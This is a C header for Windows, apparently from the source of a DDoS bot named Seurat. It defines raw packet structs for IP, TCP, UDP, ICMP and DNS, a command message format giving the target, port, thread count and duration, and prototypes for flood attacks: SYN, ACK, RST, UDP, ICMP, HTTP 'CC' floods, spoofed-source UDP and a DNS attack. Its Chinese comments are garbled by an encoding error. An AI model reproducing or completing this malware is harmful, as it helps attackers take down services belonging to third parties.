#ifndef _SEURAT_DDOS_H__
#define _SEURAT_DDOS_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "stdio.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include "wininet.h"
#pragma comment(lib, "Wininet.lib")
#include <stdlib.h>
#include <time.h>
#include <WS2TCPIP.H>
//#import "shdocvw.dll"
#include "atlbase.h"

#include <shlobj.h>
#include "macros.h"
/*--------------------------------------IP��ⱨУ��------------------------------------------*/
typedef struct  _iphdr
{
	unsigned char   h_verlen; //4λ�ֲ����ȣ���4λIP�汾��
	unsigned char   tos; //8λ���ͷ���
	unsigned short  total_len; //16λ�ܳ��� 
	unsigned short  ident; //16λ��־
	unsigned short  frag_and_flags; //����
	unsigned char   ttl; //8λ����ʱ�� 
	unsigned char   proto; //8λЭ�� 
	unsigned short  checksum; //ip�ײ�Ч���
	unsigned int    sourceIP; //α��IP��ַ�򱾻�
	unsigned int    destIP; //������ip��ַ 
}IP_HEADER, * PIP_HEADER;


typedef struct udp_hdr //UDP�ײ�
{
	unsigned short sourceport; 
	unsigned short destport; 
	unsigned short udp_length; 
	unsigned short udp_checksum; 
} UDP_HEADER;

typedef struct  _tcphdr
{
	unsigned short  th_sport; //�����˿�
	unsigned short  th_dport; //������IP�˿�
	unsigned int    th_seq; //32λ���к�
	unsigned int    th_ack; //32λȷ�Ϻ�
	unsigned char   th_lenres; //4λ�ײ�����
	unsigned char   th_flag; //6λ��־λ ACK SYN and so on
	unsigned short  th_win; //16λ���ڴ�С 
	unsigned short  th_sum; //16λЧ��� 
	unsigned short  th_urp; //16λ����ָ��
}TCP_HEADER, * PTCP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long  saddr; //������ַ��α���ַ
	unsigned long  daddr; //Ŀ���ַ
	char           mbz; 
	char           ptcl; //Э������
	unsigned short tcpl; //TCP����
}PSD_HEADER; 

/*-----------------------------ICMP data-----------------------------------------------*/
typedef struct _icmphdr				//����ICMP�ײ�
{
	BYTE   i_type;					//8λ����
	BYTE   i_code;					//8λ����
	USHORT i_cksum;					//16λУ��� 
	USHORT i_id;					//ʶ���
	USHORT i_seq;					//�������к�	
	ULONG  timestamp;				//ʱ���
}ICMP_HEADER;

//---------------------------------����˽������--------------------------------------------
typedef struct
{
	union
	{
		DWORD dwFlag;
		struct
		{
			WORD wa;
			WORD wb;
		};
	};

	WORD wCmd;
	WORD w1;
	WORD w2;
	WORD w3;
	char data[1024];
}MMSG;

//dns
typedef struct {
	unsigned	id :16;		/*%< query identification number */
	/* fields in third byte */
	unsigned	qr: 1;		/*%< response flag */
	unsigned	opcode: 4;	/*%< purpose of message */
	unsigned	aa: 1;		/*%< authoritive answer */
	unsigned	tc: 1;		/*%< truncated message */
	unsigned	rd: 1;		/*%< recursion desired */
	/* fields in fourth byte */
	unsigned	ra: 1;		/*%< recursion available */
	unsigned	unused :1;	/*%< unused bits (MBZ as of 4.9.3a3) */
	unsigned	ad: 1;		/*%< authentic data from named */
	unsigned	cd: 1;		/*%< checking disabled by resolver */
	unsigned	rcode :4;	/*%< response code */
	
	/* remaining bytes */
	unsigned	qdcount :16;	/*%< number of question entries */
	unsigned	ancount :16;	/*%< number of answer entries */
	unsigned	nscount :16;	/*%< number of authority entries */
	unsigned	arcount :16;	/*%< number of resource entries */
} HEADER;

struct ipheader					 //ip header
{
	unsigned char ip_hl:4,ip_v:4;//�ײ����ȺͰ汾
	unsigned char ip_tos;        //��������
	unsigned short int ip_len;   //�ܳ���
	unsigned short int ip_id;    //��ʶ
	unsigned short int ip_off;   //Ƭƫ��
	unsigned char ip_ttl;	     //����ʱ��
	unsigned char ip_p;	     //Э��
	unsigned short int ip_sum;   //У���
	unsigned int ip_src;	     //ip��Դ��ַ
	unsigned int ip_dst;	    //Ŀ�ĵ�ַ
};
struct udpheader				 //udp header
{
	unsigned short int port_src; //Դ�˿�
	unsigned short int port_dst; //Ŀ�Ķ˿�
	unsigned short int udp_len;  //udp�û����ݱ��ĳ���
	unsigned short int udp_sum;  //У���
};
struct dns_msg					//send bag
{
	ipheader ip;         //ip��ͷ
	udpheader udp;		//udp��ͷ
	HEADER dnshead;				//dns��ͷ
	char dnsbuf[100];			//udp���ݱ�
};

typedef struct _MSGHEAD
{
	DWORD dwStact;              //���ܱ�־    0
	char  strMsg[100];          //            4
	char  dnsMsg[100];          //Ҫ��ѯ������
	//	char  dnsAddr[100];         //Ҫ��ѯ������
	DWORD dwPort;               //            104 
	int   nThread;              //            108
	DWORD dwTime;               //            112     
	int   nCount1;              //            116
	int   nCOunt2;              //            120 
}MSGHEAD,*PMSGHEAD;


//----------------------���幥������-----------------------------------
void CC_SINCON(char ip[500],int port,int time,int xc);     //CC ����
void LX_CC(char ip[500],int port,int time, int xc,int iext1,int iext2);      //��ѯ
void RST_FLOOD(char ip[500],int port,int time,int xc) ;    //HTTP GetЭ��	10	DK����
void Break_CC(char ip[500],int port, int time,int xc);     //�Ʒ�CC
void UDP_FLOOD(char ip[500],int port,int time,int xc) ;    //UDPFlood
void SYN_FLOOD(char ip[500],int port,int time,int xc) ;    //SYN Flood
void ICMP_FLOOD(char ip[500],int port,int time,int xc);    //ICMP�����������뺯��
void TCP_CONNECT(char ip[500],int port,int time,int xc);   //TCP������
void SF_SF(char ip[500],int port, int time,int xc) ;       //˽���������뺯��
void ACK_FLOOD(char ip[500],int port,int time,int xc);     //ACK����		==6		����7.0
void WZUDPS(char ip[500],int port, int time,int xc) ;       //α��ԴUDP(����)	UDP

void DNS_ATT(char ip[500],char dns[500],int time);

USHORT checksum(USHORT *buffer,int size);   //����У���
int SEU_Rand(int ran);                     //�Զ���������������
int Mir2EnCode(BYTE *pInBuff,DWORD dwInLen,BYTE *pOut,DWORD dwOutLen) ; //MIR��������
void   StopDDOS();                         //����ֹͣ����

#endif